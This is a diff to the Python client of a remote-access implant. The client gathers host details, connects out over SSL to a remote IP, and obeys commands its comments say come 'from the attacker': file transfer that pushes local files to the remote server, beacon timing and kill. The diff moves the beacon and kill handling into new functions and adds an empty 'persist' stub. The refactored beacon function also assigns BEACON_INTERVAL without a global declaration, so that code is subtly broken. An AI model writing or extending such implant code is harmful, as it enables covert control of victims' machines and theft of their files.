@@ -120,6 +120,9 @@ processor: {}
 node: {}""".format(getpid(),date_time,platform.system(),platform.release(),platform.version(),platform.machine(),platform.processor(),platform.node())
     return sys_info
 
+def persist(conn, data):
+    pass
+
 def send_data(conn, plain_text):
     msg = plain_text + "[END]"
     conn.send(msg.encode('utf-8'))
@@ -155,6 +158,26 @@ def file_transfer_put(conn, file_name):     #download from server - response fro
             f.write(data)
     f.close()
 
+def beacon(conn, data):
+    temp = data.strip("[BEACON]")
+    if temp == "?":
+        send_data(conn, "Beacon Setting: {}".format(BEACON_INTERVAL))
+    elif temp.isdigit():
+        BEACON_INTERVAL = int(data.strip("[BEACON]"))
+        send_data(conn, "Beacon Setting: {} seconds".format(BEACON_INTERVAL))
+    elif temp == "START":
+        if VERBOSE:
+            print_info("Received Beacon Instruction")
+        conn.close()
+        raise ConnectionResetError
+
+def kill_term(conn):
+    if VERBOSE:
+        print_warn("Received kill command")
+    conn.close()
+    kill(getpid(), SIGTERM)
+    
+
 def connect(remote_ip=remote_ip, remote_port=remote_port):
     global BEACON_INTERVAL
 
@@ -179,8 +202,6 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
             print_good("SSL established. Peer: {}".format(conn.getpeercert()))
     except ConnectionRefusedError:
         raise ConnectionRefusedError
-    except socks.GeneralProxyError: 
-        raise socks.GeneralProxyError("Connection closed unexpectedly")
     except Exception as e:
         if VERBOSE:
             print(e)
@@ -195,23 +216,10 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
         if VERBOSE:
             print_info("Received:\n" + data)
         if '[kill]' == data: # if we got terminate order from the attacker, close the socket and break the loop
-            if VERBOSE:
-                print_warn("Received kill command")
-            conn.close()
-            kill(getpid(), SIGTERM)
-            break 
+            kill_term(conn)
+            break
         elif "[BEACON]" in data:
-            temp = data.strip("[BEACON]")
-            if temp == "?":
-                send_data(conn, "Beacon Setting: {}".format(BEACON_INTERVAL))
-            elif temp.isdigit():
-                BEACON_INTERVAL = int(data.strip("[BEACON]"))
-                send_data(conn, "Beacon Setting: {} seconds".format(BEACON_INTERVAL))
-            elif temp == "START":
-                if VERBOSE:
-                    print_info("Received Beacon Instruction")
-                conn.close()
-                raise ConnectionResetError
+            beacon(conn, data)
         elif "get" in data:  #find file locally then push to remote server
             if VERBOSE:
                 print_info("Received GET")
